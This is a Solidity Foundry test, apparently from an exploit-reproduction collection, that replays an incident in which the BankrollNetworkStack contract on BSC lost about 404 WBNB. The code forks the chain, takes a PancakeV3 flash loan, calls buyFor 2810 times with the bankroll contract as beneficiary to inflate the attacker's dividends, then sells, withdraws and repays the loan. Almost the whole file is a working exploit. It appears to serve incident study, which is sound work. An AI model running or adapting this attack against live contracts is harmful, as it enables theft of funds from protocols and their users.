// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~404 WBNB
// Attacker : 0x4645863205b47a0a3344684489e8c446a437d66c
// Attack Contract : 0x8f921e27e3af106015d1c3a244ec4f48dbfcad14
// Vulnerable Contract : 0x564d4126af2b195ffaa7fb470ed658b1d9d07a5
// Attack Tx : 0xd4c7c11c46f81b6bf98284e4921a5b9f0ff97b4c71ebade206cb10507e4503b0

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x564d4126af2b195ffaa7fb470ed658b1d9d07a54#code

// @Analysis
// https://x.com/Phalcon_xyz/status/1838042368018137547

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IBankrollNetworkStack bankRoll = IBankrollNetworkStack(0x564D4126AF2B195fFAa7fB470ED658b1D9D07A54);
    uint256 borrow_amount;


    function setUp() external 
    {
        cheats.createSelectFork("bsc", 42481611 - 1);
    }

    function testExploit() external {

        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);

        borrow_amount = 16_000 ether;
        pool.flash(address(this),0,borrow_amount, "0x01");

        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory) public {

        WBNB.approve(address(bankRoll), type(uint256).max);

        bankRoll.buyFor(address(this), WBNB.balanceOf(address(this)));

        uint256 bal_bank_roll = WBNB.balanceOf(address(bankRoll));

        emit log_named_decimal_uint("[Before] Attacker bank roll balance", bankRoll.myTokens(), 0);
        emit log_named_decimal_uint("[Before] Attacker bank roll dividends", bankRoll.dividendsOf(address(this)), 0);

        for(uint i=0; i < 2810; i++){
            bankRoll.buyFor(address(bankRoll), bal_bank_roll);
        }

        emit log_named_decimal_uint("[After] Attacker bank roll balance", bankRoll.myTokens(), 0);
        emit log_named_decimal_uint("[After] Attacker bank roll dividends", bankRoll.dividendsOf(address(this)), 0);

        bankRoll.sell(bankRoll.myTokens());
        bankRoll.withdraw();

        WBNB.transfer(address(pool), borrow_amount + fee0 + fee1);

    }

    receive() external payable {
        
    }
}


interface IBankrollNetworkStack{
    function buyFor(address _customerAddress, uint buy_amount) external returns (uint256);
    function myTokens() external view returns (uint256);
    function sell(uint256 _amountOfTokens) external;
    function dividendsOf(address _customerAddress) external view returns (uint256);
    function withdraw() external;
}